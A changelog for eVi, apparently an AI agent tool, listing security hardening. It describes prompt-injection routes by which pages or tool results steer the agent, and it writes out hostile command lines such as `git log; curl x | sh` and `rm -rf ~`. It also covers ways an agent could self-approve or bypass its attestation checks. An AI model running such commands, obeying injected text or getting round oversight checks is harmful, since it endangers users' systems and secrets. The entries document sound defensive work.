# Changelog

All notable user-visible changes to eVi. Format loosely follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

## [Unreleased]

### Security
- **Safe mode no longer offers slash commands from the system temp folder.**
  Safe mode pointed the command store at a fresh temp folder, but the store
  also scans its root's parent for `plugins/`, and that parent was the system
  temp folder: on a shared Linux machine another user could create
  `/tmp/plugins/<name>/commands/` and have `evi chat --safe-mode` and the web
  app in safe mode offer those commands. The store now lives inside a private
  temp folder of its own (`evi.commands.safe_mode_store`).
- **Allowing one shell command no longer allows whatever is chained after it.**
  Rules were matched against the whole line, so `allow run_command git*` also
  approved `git log; curl x | sh`, and `destructive_allow =
  ["*--force-with-lease*"]` exempted `rm -rf ~; git push --force-with-lease`.
  eVi now splits the line into its commands the way the shell would. An allow
  rule approves it only if every command is allowed, the line parses and its
  redirects stay inside the working folder; `destructive_allow` exempts only
  the commands it matches; `deny` rules and `hard_deny` catch a command
  anywhere in the line. A line eVi can't follow (`bash -c "…"`, `eval`,
  `curl x | sh`, an unbalanced quote, and on Windows any `%VAR%` or `for /f`)
  is never approved by an allow rule that names a command. Expect more
  prompts under such rules (`FOO=1 git log`, `if`/`for` blocks); a broad
  `allow run_command` works as before. An allow rule no longer matches
  `run_command`'s `cwd` argument. See "Shell command lines" in
  docs/features/permissions-and-sandbox.md.
- **`web_fetch` can no longer be steered to eVi itself, your LAN or a cloud
  metadata service.** It followed redirects without checking them, so any web
  page could send it to eVi's own API on `127.0.0.1:8473` or to
  `169.254.169.254`, and it read the whole body before cutting it to 1 MB.
  Loopback, private, link-local and metadata addresses are now refused unless
  the host is in `[auto] trusted_domains` (eVi's own API port is refused even
  then), every redirect is re-checked (at most 5), a public page can't
  redirect into the LAN, and the body is capped as it streams, with a 60 s
  limit. If you
  `web_fetch` a LAN page (Home Assistant, SearXNG), add its host to
  `trusted_domains`. `web_fetch` no longer uses `HTTP(S)_PROXY`.
- **The managed runtime checks what it downloads.** The llama.cpp build and
  catalog models were used as downloaded, the models from a moving `main`.
  Each download is now checked against a sha256 pinned in eVi and discarded on
  a mismatch before anything is extracted or run (`… failed verification`),
  models come from a pinned commit, archives can't write outside their folder,
  and a failed install leaves nothing half-installed. A catalog model already
  on disk counts as installed only if it matches its pin, so the first check
  after updating hashes each one once, and a file `evi models pull hf:` put
  at the same path is replaced by the pinned one when you select that model.
- **A repository you open can no longer run programs through eVi's own git
  calls.** Its `.git/config` could make the git tools, `evi review`,
  worktrees or the status line run a program through `core.fsmonitor`, hooks,
  filter or diff drivers, the pager or `gpg.program`. Those are now off for
  eVi's calls (filters and hooks from your global or system config, such as
  Git LFS, still run). `evi worktree create` runs no hooks, not even your
  global post-checkout, and skips LFS downloads (run `git lfs pull` after).
  The git tools refuse refs starting with `-` and `git_diff` paths outside the
  repository (which could read any file), refuse a bare repo or a
  `core.worktree` that points elsewhere, and never run a `git.exe` from the
  current folder. The destructive-command guard now asks before a shell line
  sets `GIT_*` or `LD_PRELOAD` / `DYLD_*` variables. Plugin and skill installs
  from a private HTTPS repo now need a credential helper.
- **Slash commands no longer read files named in their arguments.**
  `/explain @~/.ssh/id_ed25519` inlined the key into the prompt, and an MCP
  client could do the same through a served prompt. Only `@path` refs written
  in the command file itself are read, only inside the working folder or
  `[auto] trusted_dirs`, and never a protected path or key/credential file;
  MCP-served prompts never inline. Commands that relied on `@path` in their
  arguments, on `@$1`, or on a file outside the working folder
  (`@~/notes/style.md`) stop inlining it: add that folder to `trusted_dirs`.
- **Notification text can't be read as AppleScript.** The macOS toast built
  its AppleScript from the title and body, escaping only `"`. They are now
  passed as arguments, and Linux `notify-send` gets `--` before them. eVi only
  sends fixed text today, so this is hardening.
- **A repository's `.evi.toml` applies only in a folder you trust.** Opening a
  repository applied its `.evi.toml` without asking (since 1.0.53 only the
  allowlisted keys, but still unasked). Now the whole file is ignored until
  you trust the folder, and again after any edit to it. `evi chat` (and
  `evi sessions resume` / `continue` / `fork`) shows what the file sets and
  asks `y/N` the first time; `evi trust [PATH]` trusts a folder up front
  (`--status`, `--list`, `--revoke`, `--yes` for scripts) and refuses inside
  an `evi chat` session, or in any process eVi's agent-hosting commands
  started (`evi run`, the web and desktop apps, the scheduler …), so an
  agent can't trust its own folder. Trust
  is per repository and shared by its worktrees; outside git it covers exactly
  the folder you trusted. `evi run`, `evi batch`, the web UI and the scheduler
  never ask: in an untrusted folder they log `eVi: not applying project config
  …`, run with the project config off and exit as usual. `.evi.toml`, `EVI.md`
  and `AGENTS.md` are now looked for only up to the repository's top level, so
  one in a folder above it (a `~/AGENTS.md`) no longer applies inside it;
  EVI.md and AGENTS.md still load in untrusted folders. The web API gains
  `GET` / `POST /api/project/trust`. See "Trusting a folder" in
  docs/configuration.md.
- **Changing a setting no longer copies a repository's or a profile's values
  into your `config.toml`.** eVi saved the whole merged config, so a `/model`,
  `/effort` or web Settings change made inside a repository wrote its
  `.evi.toml` values, and the active profile's, into `config.toml` for good.
  Now eVi writes back your own file with only the setting you changed; for a
  list you inherit entries of, only the entries you add or remove. Setting a
  value you only inherit (the profile's model while that profile is active)
  isn't saved; put it in `config.toml` to keep it.
- **Protected paths guard eVi's instructions, hooks and CI in every mode.** A
  prompt-injected agent could rewrite `EVI.md`, `AGENTS.md`, `.evi.toml`, a
  git hook or a CI workflow without a prompt: protected paths covered only
  file and code tools, and `yolo`, `/auto on`, `evi run -y` or an allow rule
  skipped them. Now a write to a protected path asks in every mode, whatever
  allow rule matches, and is denied when nothing can answer (plan mode or a
  deny rule denies it too). On top of `[auto] protected_paths` (secret and
  shell start-up files), eVi always protects `.evi.toml`, `EVI.md`,
  `AGENTS.md`, `.evi/**`, `~/.evi/**` (and `EVI_HOME`), `.git/hooks/**`,
  `.git/config`, the same under `.git/modules/`, `.github/workflows/**` and
  `.vscode/tasks.json`. Every tool counts, MCP tools included; for a shell
  line, so do its redirects (followed through `cd`) and the files `cp`, `mv`,
  `tee`, `sed -i`, `Set-Content` and similar commands name, a destination
  folder too (`cp x .git/hooks`). Paths are matched on their real path, so a
  symlink or junction is caught. Reading a secret file (`.env`, a key) now
  asks even with `fs` auto-approved. An `evi run -y` in CI that edits
  AGENTS.md is now denied: un-protect an entry with the new
  `[auto] protected_paths_remove`. See "Protected paths" in
  docs/features/permissions-and-sandbox.md.
- **`/auto on` no longer switches off `hard_deny`, and `a` approves one
  call.** `/auto on` (and `evi run -y`) allowed every call before `hard_deny`
  was checked, and a destructive-guard prompt skipped `hard_deny` and plan
  mode. Now `/auto on` acts as `yolo`: `hard_deny`, protected paths and the
  guard still apply, and a policy deny beats a guard prompt. At the CLI's
  single-call prompt `a` turned on allow-all for the rest of the session,
  while in the batch prompt it meant just those calls; now `y` or `a` approve
  that call only. Session-wide approval is `s` in both prompts, and it asks
  `allow EVERY tool call for the rest of this session (like /auto on)? y/N`
  first; any answer but `y` turns nothing on and denies the call.
- **Category rules work, and allow rules no longer clear the worst guard
  hits.** `rules` and `hard_deny` entries matched only the tool name, so the
  documented `deny shell rm*`, `deny fs *.env`, `allow web` and
  `hard_deny = ["shell rm -rf*"]` silently did nothing. The tool-glob now
  matches the tool name or its category (`shell` also covers `monitor`
  commands), so they take effect: check any `allow shell` or `allow fs` rule
  you wrote. No allow rule clears a block-severity guard hit any more
  (`rm -rf ~`, a force-push, `curl … | sh`), so
  `allow run_command git push --force-with-lease*` no longer clears that push:
  use `destructive_allow`. A `destructive_allow` glob with a wildcard in its
  command word (`*--force-with-lease*`, `git*`) is ignored, since it also
  exempted `rm -rf ~ --force-with-lease`. `trusted_dirs` approves a file call
  only when every path argument resolves inside a trusted folder; any string
  argument used to count, so content naming the folder was enough, and
  `run_python` passed when eVi ran inside one. Permission checks no longer
  resolve a network path the model names (`\\host\share\…`), which connected
  to that host before anyone approved the call.
- **`evi mcp serve --http` can't be reached by a web page, or from the
  network without a token.** A tokenless HTTP server answered any `Host`, so a
  page using DNS rebinding could call eVi's tools through your browser, and
  nothing stopped `--host 0.0.0.0` without `--token`. Without a token,
  `evi mcp serve --http` and Settings → MCP → Serve now answer only loopback
  `Host` / `Origin` headers (`421` / `403` otherwise), and a non-loopback
  `--host` without `--token` exits with code 2 and `error: refusing to serve
  MCP over HTTP on 0.0.0.0 without --token. Pass --token, or bind to
  127.0.0.1.`
- **Without an access token, eVi's web server answers only this computer.**
  A server with no token checked only the `Host` header, which curl or a
  script on the network sets freely, so `evi web --host 0.0.0.0`, the desktop
  app's LAN access (`[federation] bind_lan`) or a container without a token
  let anyone who could reach the port drive eVi and its tools. Now a server
  with no `[web] auth_token`, launch token (`EVI_WEB_AUTH_TOKEN`) or
  multi-user logins answers `403` to every connection that doesn't come from
  this machine. A request a reverse proxy forwarded (`X-Forwarded-For`,
  `Forwarded`, `X-Real-IP`) counts as another machine's, so a proxy on the
  same machine needs a token too. `EVI_ALLOW_ANY_HOST=1` still relaxes the
  `Host` check but no longer lets other machines in. Routine webhooks
  (`/api/routine/<token>`), whose URL is the credential, are exempt. `evi web`
  with a non-loopback `--host` and no token refuses to start (exit 1) and says
  how to set one (`evi web-config token rotate`). See "What changed for
  existing setups" in docs/security.md.
- **Browser calls to eVi's API must come from eVi's own pages.** A browser's
  `POST`, `PUT`, `PATCH` or `DELETE` to `/api/…` now needs an `X-Evi-Client`
  header unless it carries the access token. eVi's web UI and desktop app
  send it; another site can't add it without a CORS preflight, which eVi
  never answers. This backs up 1.0.53's cross-site check and still holds when
  `EVI_ALLOW_CROSS_ORIGIN=1` turns that check off. A request counts as a
  browser's only when it has an `Origin` or a `Sec-Fetch-Site` header, so the
  CLI, peers, curl and the VS Code extension (older builds too) are
  unaffected, except when they start a model download (below). A script
  calling the API from a browser page should send `X-Evi-Client: 1`.
- **Starting a model download needs eVi's own page or the token.**
  `GET /api/backend/pull` starts an Ollama download of whatever model it
  names, and an `<img>`, a link or a frame sends a GET with no script, on
  another site or inside eVi's own page. Without the access token it now
  needs an `X-Evi-Client` header (any value) from every caller, browser or not,
  and answers `403` without one; eVi's UI reads the progress with `fetch`,
  which sends it. A script or curl that starts a pull without the token must
  add `-H 'X-Evi-Client: 1'`. A pull that another site or another local port
  starts is refused, header or not, even with `EVI_ALLOW_CROSS_ORIGIN=1`.
- **Model output can't run code or fetch anything by itself in the web and
  desktop UI.** Replies were inserted as raw HTML, so a page, file or MCP result that
  steered the model could make it write an `<img onerror>` that ran script
  with eVi's API on the same origin, or an image whose address leaked the
  chat or hit eVi's own endpoints. Replies now go through DOMPurify with a
  profile for chat: no scripts, event handlers, SVG, frames, forms, styles,
  ids or attributes that point at the UI's controls. Images load only from
  inline `data:` or eVi's own `/images/<name>`; any other shows as an
  `[image: …]` link, and a link back into eVi loses its target. Mermaid
  diagrams render in a frame that can load nothing, a diagram that tries is
  shown as its source, and a diagram's `%%{init}%%` can no longer set
  `themeCSS`, `fontFamily` or similar keys. The page runs under a
  Content-Security-Policy that allows only eVi's own script files: the UI's
  code moved from `index.html` to `static/app.js`, and marked, DOMPurify,
  highlight.js and mermaid ship with eVi at pinned versions (about 4.6 MB)
  instead of loading from a CDN, so replies render offline too. Raw HTML in
  a reply loses inline styles, ids, forms and buttons. See "The web UI" in
  docs/security.md.
- **Another site can't frame eVi, and the files it serves can't act as its
  page.** Any website could load eVi in a hidden frame and steer a click onto
  Approve or Settings. The page now sends its policy as a
  `Content-Security-Policy` header with `frame-ancestors 'none'`, plus
  `X-Frame-Options: DENY`, and a copy served without them (through a proxy
  that strips headers) blanks itself inside a frame. Every response carries
  `X-Content-Type-Options: nosniff`, and generated images (`/images/…`) and
  attachments (`/uploads/…`) get a sandbox policy, so an HTML or SVG file
  opened directly runs nothing. That includes the `500` for a route that
  failed with an unexpected error, which the server sends from outside the
  layer that adds these headers: it gets the same ones (the page's policy
  and framing headers too), its body is still a plain `Internal Server
  Error`, and the error is still logged.
- **In multi-user mode, a users.json login can use only its own chats.** Any
  login could change the host's settings, hooks, plugins, channels, peers,
  managed runtime, MCP servers and backends, run its workflows, recipes and
  evals, take federated and A2A tasks, and list or rewind every user's file
  checkpoints. Those routes are now owner-only (`403` for a login), and the
  owner is whoever holds `[web] auth_token` or the launch token. `/model <id>`
  in a chat, which saves to the host's `config.toml`, is owner-only too. A
  login named `owner` shared the owner's sessions, transcripts and memory; it,
  and any name that lands in the same folder (`Owner`, `owner.`), can no
  longer sign in, and `evi doctor` names it with the command to remove it
  (`evi web-config users add` still accepts the name). See "Multi-user mode"
  in docs/security.md.
- **In multi-user mode, each login's memory tools keep to its own notes.**
  `remember`, `recall`, `forget`, `list_memories` and `recall_by_tag` used the
  shared `~/.evi/memory` from every login's chats, so one login could read or
  delete what another saved, while each prompt listed the login's own
  `users/<name>/memory`. The tools now use that folder too, and so do the
  subagents a login's chat starts. Notes they saved in the shared folder
  before are not moved. The owner's chats use `users/owner/memory`; the
  host's own runs (workflows, recipes, ultracode, evals, routines, federated
  and A2A tasks) still use `~/.evi/memory`.
- **Logins that would share a data folder can't sign in.** `bob smith`,
  `bob_smith` and `bob/smith` all kept their transcripts and memory in
  `users/bob_smith`, as did `Alice` and `alice` on Windows and macOS. Each of
  those logins now gets `403` until all but one are renamed or removed, the
  sign-in overlay says why without naming the other login, and the server
  log names each group once. One name listed twice (two tokens) is still one
  login. `evi doctor` doesn't report this yet.
- **A chat nobody is watching no longer approves tools by itself.** A channel
  push with `run: true` (`POST /api/session/<id>/channel`) runs a turn with
  no one to ask: in a session that hadn't chatted yet, every tool that would
  ask was approved, and in one that had, the turn waited forever on a prompt
  sent to a stream long closed. A session with no client attached now denies
  any tool that would ask, and the push returns.
- **Runs nobody is watching no longer approve tools by themselves.** With no
  one to ask, scheduled tasks, subagents (and so `evi team` and `evi dream`),
  ultracode stages, the web app's workflow and recipe runs and SDK agents
  built without a `permission_callback` ran every tool call that would have
  asked. Such a call is now denied, and the model is told the run is
  unattended, unless you set `[auto] unattended_policy = "allow"`. What you
  pre-approved still runs (`auto_approve` categories, `allow` rules, trusted
  dirs and domains). Whatever the policy, and under `-y`, `/auto on` or
  `yolo` too, an unattended run never writes a protected path, never runs a
  command the destructive-command guard flags and now also never reads a
  protected secret (`.env`, a key) that no explicit `allow` rule names. Each
  run names its policy: a scheduled task's log has a `# policy: …` line, a
  run with a refused call gets the status `denied: <tools> (policy deny)` in
  `evi schedule list`, and `evi run --format json`, `evi batch` and the web
  app's workflow and recipe responses carry `policy`. A scheduled job that
  relied on calls running unasked needs an `allow` rule, the category in
  `auto_approve`, or the opt-in; an SDK program can pass
  `permission_callback=` or `unattended_policy="allow"` to `build_agent`.
  `evi workflow run` still approves every tool (eval runs, from `evi eval
  run`, the web app and the scheduler alike, now hold each case to the
  implementer policy, see Changed). See "Unattended runs" in
  docs/features/permissions-and-sandbox.md.
- **Peers, webhooks and channel pushes get only what you pre-approved.** A
  federated or A2A task, a routine webhook without `yes` and a channel push
  with `run: true` followed your own `[auto] mode`, so on a machine set to
  `yolo` they ran every tool (and under `accept_edits` every file and code
  call), and a channel push also inherited the session's `/auto on` and
  approvals. They now run only `[auto] auto_approve`, your `allow` rules and
  trusted dirs and domains, whatever `[auto] mode` or `unattended_policy`
  says, and a subagent they start keeps those limits. The default
  `auto_approve` still includes `fs`: on a machine that serves peers or
  webhooks, take it out if a remote task shouldn't write files. Such a run
  never runs code by category (see below).
- **Unattended runs refuse delegate CLI-agent backends.** `codex`, `gemini`,
  `amp`, `qwen` and `copilot` run their own shell, file and web tools outside
  eVi's checks, and nobody was there to see them. A scheduled task,
  `evi run`, `evi batch`, `evi workflow run`, `evi team`, a subagent with no
  chat to ask, an ultracode stage and the web app's workflow, recipe, routine,
  channel-push, federation and A2A runs now refuse one, as `[llm] backend` or
  any `[models] *_backend`, with a message naming the setting (`409` from the
  web app). Set `[llm] allow_cli_agent_unattended = true` to accept the risk;
  the Telegram channel refuses them even then.
- **Subagents, dreams and ultracode do only what they are for.** A subagent
  profile's tools are now cut to your `[tools]` toggles and safe mode (a
  profile listing `shell` got `run_command` even with `shell = false`), a
  profile may name single tools, and Explore gets `read_file`, `list_dir`,
  `find_files` and `search_files` instead of the whole `fs` category, which
  can write. A subagent in a chat you watch asks through that chat's prompt,
  one at a time, instead of running everything unasked, and your `/auto on`
  covers it. `evi dream` reads transcripts full of tool output anyone could
  have written, so it no longer changes memory: it gets read-only file and
  memory tools, treats the transcripts as data and ends its report with
  `ADD` / `UPDATE` / `FORGET` proposals for you to apply. Ultracode solvers
  (`evi ultracode`, `/ultra`, `/effort ultracode`) get only their mode's
  read-only file tools, so the pipeline answers in text and no longer edits
  the working tree, where parallel solvers overwrote each other.
  `evi review --multi` and `/ultrareview` reviewers get only read-only tools
  (their git and index readers included), and `evi review --fix` gets only
  the file tools.
- **The Telegram bot no longer inherits your desktop policy.** A paired
  sender's turn ran under your `[auto]` settings, so `yolo`, `accept_edits`
  or an auto-approved `code` on the desktop let anyone you paired run code
  with whatever `telegram_tools` offered. The bot now has a policy of its
  own: only the categories in the new `[channels] telegram_auto_approve`
  (none by default) and its own memory and skill reads run, everything else
  is denied, and nothing in `[auto]` widens that (your `hard_deny`, deny
  rules, protected paths and the destructive-command guard still apply). It
  answers only direct chats unless `allow_groups = true` (the TOML boolean),
  never answers an anonymous group admin or a post sent for a channel, and
  sends error text only to a paired sender's direct chat. Memory is
  recall-only by default (`memory_mode = "recall"`): `"staged"` keeps each
  `remember` in `~/.evi/inbox/channel/`, marked untrusted, until you apply it
  (for now from Python, with `evi.channels.inbox`), and `"full"` writes
  directly, as before. `telegram_tools = []` now means no tools, `subagent`
  is never offered, and each turn's policy is logged to
  `~/.evi/logs/channels/telegram.log`. If the bot should remember things,
  answer in a group or use `fs` or `code` without asking, set `memory_mode`,
  `allow_groups` or `telegram_auto_approve`. See docs/features/channels.md.
- **Your hooks now guard the desktop and web app, the Telegram bridge and
  subagents.** `hooks.toml` ran only where the CLI built the agent, although
  the docs said every front end: web and desktop chats; the workflow, recipe,
  routine and ultracode runs the web app starts; federated and A2A tasks;
  Telegram turns; and the subagents a chat spawns all ran without it, so a
  "never write outside this folder" guard didn't hold there. They all load it
  now (safe mode still turns hooks off), and a subagent works in the folder
  of the chat that spawned it. The web and desktop app share one copy, so a
  Save in Settings → Hooks, or installing or removing a plugin, applies to
  every open chat at once, without a restart. A subagent gets only the tool
  hooks (`before_tool_call`, `after_tool_call`), so `user_prompt_submit` and
  `stop` still fire once per turn. Eval runs skip hooks, so scores don't
  depend on the machine, and in multi-user mode every login's chats run the
  owner's `hooks.toml`. A hook you wrote for the CLI now also sees desktop
  chats and prompts sent from Telegram: check it before you update.
- **Desktop on Windows opens links and folders with the system's own
  `rundll32.exe` and `explorer.exe`.** They were started by bare name, which
  Windows looks up in the app's own folder first, so a `rundll32.exe` planted
  next to the app would have run instead. They now run by full path under
  `%SystemRoot%`.
- **The desktop window talks only to your eVi server, and stays on it.** The
  page had Tauri's whole JavaScript API (`window.__TAURI__`), and the app's
  commands were granted to every `localhost` and `127.0.0.1` port, so any
  local page the window reached could call them. Now `window.__TAURI__` is
  gone, the page reaches the shell only through the app's nine desktop
  commands and only from the server's own origin, the window refuses to
  navigate anywhere else, and links in replies open in the system browser.
  In thin-client mode, set `EVI_REMOTE_URL` to the address the server finally
  answers on, since the window won't follow a redirect to another origin.
  Against a server older than this release the chat works but the in-page
  desktop actions (update prompts, Open Logs, links in the system browser)
  don't. This comes with the desktop app itself, not a core-only update.
- **Voice transcription uploads stop at 32 MB** (`413`), like attachments;
  `/api/transcribe` wrote whatever it was sent to disk.
- **Running code asks first, and `monitor` no longer runs shell commands
  behind the shell toggle.** The `code` category in `[auto] auto_approve`
  covered reading code, running it (`run_python`) and `monitor` with
  `kind=command`, which ran a shell line with no prompt even with
  `[tools] shell = false`. Each call now counts as what it does. Reading code
  is the new `code_read`: `python_symbols`, `monitor` tailing a file,
  `check_file` on Python (or on a file type with no linter) and `run_python`
  while the OS sandbox is active. Running code is `code`: `run_python`
  otherwise, and `check_file` on JavaScript, TypeScript, Go or Rust, whose
  linters run the project's own code. A shell line is `shell`, whatever tool
  runs it. The default list is now `fs, code_read, memory, skills, image`, so
  `run_python` asks; a list naming `code` still covers `code_read`.
  `accept_edits` and `trusted_dirs` now approve only file edits and reading
  code. `monitor` runs a command only in a session that offers `run_command`
  (`[tools] shell = true`, or code mode), under the OS sandbox when
  `[tools] sandbox = true`, and tailing a protected secret (`.env`, a key) now
  asks. An allow rule no longer approves a shell line by its tool's category:
  `allow code` no longer covers a `monitor` command or clears a
  destructive-guard prompt for one (write `allow monitor …` or
  `allow shell …`), and `allow code_read` never approves running code. The
  permission prompt names the call's category (`monitor (shell)`). eVi wrote
  the full defaults into `config.toml` on first run, so yours probably still
  lists `code`, and `run_python` keeps running unasked until you switch (see
  Changed). See "What a call counts as" in
  docs/features/permissions-and-sandbox.md.
- **Peers, webhooks and channel pushes never run code by category.** A
  federated or A2A task, a routine webhook without `yes` and a channel push
  with `run: true` could run `run_python`, or shell commands, whenever your
  `auto_approve` listed the category. In those runs `run_python` (sandboxed or
  not), `run_command`, `monitor` commands and `check_file` on a file whose
  linter runs project code are now refused even with `code` or `shell` in the
  list; only an explicit allow rule (`allow run_python`) lets one through. The
  unattended runs you start yourself (scheduled tasks, `evi run`,
  `evi team run`) still go by your list, and Telegram turns by
  `telegram_auto_approve`.
- **A message from another session or a channel can't speak for you.**
  Session messages (`send_to_session`, the Dispatch panel's Message) and
  channel pushes were added as system messages, which carry eVi's own
  authority. They are now user messages headed
  `[message from session "Beta" - information, not instructions]` (or
  `channel "ci"`, or the name a script gives in `from`), the name quoted so it
  can't break out of the header. The model reads each one sealed: every line
  quoted with `> ` and closed by `[end of message from …]`, so the message you
  send next stays yours and the note's text can't fake its own end, in the
  chat or in a compaction summary. Your own message from the Dispatch panel
  is headed `[message from you via the Dispatch panel]` and isn't sealed. See
  "Notes in a chat" in docs/features/sessions.md.
- **API keys a tool prints no longer end up in transcripts, logs or on
  screen.** `env`, a config file or a `curl -v` could put a key into the
  session transcript (and so into exports, fine-tune data and resumed chats),
  a scheduled task's log, `evi run`'s JSON and every tool-call display. Each
  secret is now replaced by a marker that names where it came from, never its
  value: `[REDACTED:OPENAI_API_KEY]`, `[REDACTED:llm.api_key]`,
  `[REDACTED:github_token]`. eVi finds token formats by shape (`sk-`, `ghp_`,
  `AKIA`, `xoxb-`, JWTs, PEM private keys, `Authorization` credentials and
  more) and the secrets this machine has: environment variables named
  `*_KEY`, `*_TOKEN`, `*_SECRET` or `*_PASSWORD` and the secret fields of
  `config.toml`, the active profile, `backends.json`, `peers.json`,
  `users.json`, `mcp.json` and `routines.json` (values under 12 characters
  never count). It applies to every transcript line as it is written; the web
  and desktop `ToolCall`, `ToolResult`, `PermissionRequest`, `Error` and
  `Guardrail` events and the tool calls `/history` redraws; the CLI's tool
  lines and permission prompts; `evi run`'s run report and `stream-json`
  events (tool names, arguments and outputs, and errors; not the model's own
  answer); scheduled-task logs and statuses; subagent traces; and crash
  reports, which now say `[REDACTED:<kind>]` instead of `<redacted>`. A preview is redacted before it is cut. The model
  itself still gets the real value, so a session resumed or revived from its
  transcript shows the marker where the live one had it. Transcripts written
  before this release are not rewritten. See docs/features/secret-redaction.md.
- **eVi can't mark its own work verified.** A task's `verified` or `rejected`
  status counts only with an attestation signed by the director's key, which
  `evi attest init` makes and `evi task verify|reject` signs with, from your
  own shell (see the task queue under Added). The key lives in the OS
  keyring (`evi-director`) when the optional `keyring` package works, else
  in `~/.evi/director/director.key`, readable only by you. In every mode,
  `yolo` and `/auto on` included, and whatever allow rule or unattended
  policy applies, eVi now denies a tool call that reads or writes that
  folder, and a shell line or `run_python` code that names the key, sets or
  clears `EVI_AGENT` / `EVI_DIRECTOR`, patches `evi.attest` or runs
  `evi task verify|reject` or `evi attest` (directly or through `ssh`,
  `schtasks`, `find -exec` and the like). Every process eVi starts for an
  agent carries `EVI_AGENT=1`, and so does every process started by eVi's
  agent-hosting commands (`evi chat`, `evi run`, `evi batch`, team and
  workflow runs, `evi mcp serve`, `evi web` and the desktop app's server,
  channels, the scheduler, `evi task start`), git, hooks, MCP servers and
  the Claude Agent SDK included: director tooling refuses to run there, and
  so does `evi trust`. `destructive_allow`, `destructive_disable_rules`,
  `block_destructive = false` and `protected_paths_remove` don't loosen any
  of this. Two side effects: on Windows a path argument that is a device path
  naming no drive (`\\?\Volume{…}`, `GLOBALROOT`) is now denied instead of
  asked, and a single-quoted commit message naming `evi attest` is denied
  (eVi also reads the line as cmd does); use double quotes. A task file is
  tracked, so the evidence path it names is read only when it is a bundle
  eVi wrote (under `~/.evi/evidence/`, reached through no link, or a folder
  `evi run --evidence` or `evi evidence collect --out` recorded): a
  hand-edited path can't make a verify hash the repository, its `.git` or a
  network share, and reads as evidence that changed. What a task file says
  reaches your terminal with its control characters removed. An agent running
  as your OS user can still get round this with a script it writes and then
  runs. See "The director's attestation key" in docs/security.md.
- **Commands in a run nobody watches no longer see your API keys.** A
  `run_command`, `run_python` or `monitor` command now gets no environment
  variable ending in `_KEY`, `_TOKEN` or `_SECRET` when it runs sandboxed, in
  an agent with nobody to ask (a scheduled task, `evi run`, `evi batch`,
  `evi workflow run`, ultracode, the web app's workflow and recipe runs), or
  in a remote-triggered run (federation, A2A, routines, channel pushes,
  Telegram). A scheduled job that relied on `GH_TOKEN` or an API key in the
  environment should use the tool's own stored login instead. Your own chats
  keep the full environment. See "What a command's environment holds" in
  docs/features/permissions-and-sandbox.md.

### Changed
- **Ollama models run with the context window eVi budgets for.** eVi now chats
  with Ollama through its native `/api/chat` instead of the OpenAI-compatible
  `/v1`, which ignores the window: each request carries `num_ctx` =
  `[llm] context_size`, so a model no longer loads with the server's default
  (often 4K) and silently loses the start of a longer conversation. Tools,
  images, thinking (`think`), JSON output and token counts all go through it.
  A larger window needs more memory: lower `context_size` if a model stops
  fitting on the GPU. `[llm] ollama_native = false` keeps `/v1`.
- **On Windows, commands run in PowerShell.** `run_command` and `monitor`'s
  command watch now use PowerShell (`pwsh` when it's installed, else Windows
  PowerShell 5.1) instead of `cmd.exe`, so the PowerShell lines models write
  work as written, a folder on a network share works without the mapped-drive
  workaround, and the exit code is the last native command's (or 1 when the
  last statement failed). Permission rules read lines in PowerShell's syntax
  too. Windows PowerShell 5.1 has no `&&` or `||`: separate steps with `;`, or
  install PowerShell 7. A line that starts with a quoted program path gets
  PowerShell's call operator. `[tools] windows_shell = "cmd"` keeps
  `cmd.exe`.
- **Worktrees made from inside another worktree go under the main checkout.**
  `evi worktree create` started inside a linked worktree put the new one in
  that worktree's own `.worktrees/`, so worktrees nested, and removing the
  outer one deleted the inner one and its uncommitted work. `evi worktree
  create`, `remove` and `prune` now always use the main checkout's
  `.worktrees/`.
- **The `evi-run` GitHub Action approves no tools unless you say so.** It
  passed `--yes` on every run, so a prompt built from a PR diff or issue body
  could get the model to read, write or run code on the runner. `auto_approve`
  now defaults to `false` and the config the action writes approves no tool
  category; set `auto_approve: "true"` for jobs that need tools. The prompt can
  come from `prompt_file`, the config is written owner-only under
  `$RUNNER_TEMP`, and `EVI_HOME` is no longer exported to later steps. The
  PR-review example runs in `chat` mode with the diff in the prompt.
- **`evi run`'s exit code now says why a run stopped, and `--format json`
  prints the versioned run report.** A script couldn't trust the exit code:
  `--format json` exited 0 when the run failed (the error was only in the
  JSON), and a run that ran out of turns or had its prompt refused by a
  guardrail exited 0 in every format. Now every format exits with the code
  for the run's `stop_reason`: 0 `done`, 1 `error`, 2 a usage error (no run
  happened), 3 `max_turns`, 4 `guardrail`, 130 `interrupted`. Breaking for
  existing `evi run --format json` consumers: `tools` is now `tool_calls`,
  each with `name`, `args`, `status`, `duration_ms` and `output`;
  `stop_reason` is normalized to a fixed list (`stop` and `length` become
  `done`, `max_turns_reached` becomes `max_turns`, `guardrail_blocked` and
  `hook_blocked` become `guardrail`), with the agent's raw reason moved to
  the new `done_reason`; `usage` is summed over the run instead of holding
  only the last model call; and a failure while the agent is built or during
  the turn ends with a report (`stop_reason` `error`, exit 1; in text format,
  an `error: …` line on stderr) instead of a traceback. A denied tool call
  doesn't change the outcome: a run the model finished is `done` and exits
  0, with the refused tools listed in `denied_tools` (and, in text format, a
  `denied: …` line on stderr). While `evi run` runs, eVi's own console output
  goes to stderr, so stdout holds only the answer or the JSON. `evi batch` lines carry the same report, so their `usage` is
  summed too. The `evi-run` action's step fails with this exit code (a
  failed run in `format: json`, a run out of turns in any format), after it
  has written its outputs. In the SDK, `HeadlessResult` is the report: its
  `stop_reason` takes the new values and `to_json()` prints the new shape,
  while the old `tools=` keyword and `.tools` still work (deprecated; use
  `tool_calls`). See "Stop reasons and exit codes" in
  docs/features/structured-and-batch.md.
- **`evi eval run` runs your suites in an empty throwaway workspace under
  the implementer policy, and `--json` prints the new report.** Each case
  ran in the folder you started `evi eval run` in, with every tool approved
  and the tools, hooks and project context a chat there gets, so a prompt
  that edited or deleted files did it to your checkout. Breaking for
  existing suites: each run now gets an empty temporary git repository and
  the implementer policy, with the policy's tools of the case's `mode`
  (`code` when none is set; `chat` gets none) and no network, `run_python`,
  memory, subagents or MCP tools. A case that reads your project needs
  `workspace = "repo"` (your repository at `HEAD`, which must be trusted) or
  its files in `files` / `fixture`. An unknown key, two cases with one name
  or a bad regex now stop the suite from loading (exit 2), and `evi eval
  list` shows such a file with the reason instead of leaving it out.
  `--json` and `--format json` print the report: `suite` instead of
  `name`, a row per case with `runs`, `passes` and `pass_rate`, and no
  `output`. A delegate CLI-agent backend is refused (exit 2). The web app's
  Run button and scheduled evals changed the same way (next entry). See
  "Upgrading an existing suite" in docs/features/evals.md.
- **The Evals panel's Run button and scheduled evals give the same verdict
  as `evi eval run`.** Both ran each case once in the server's or
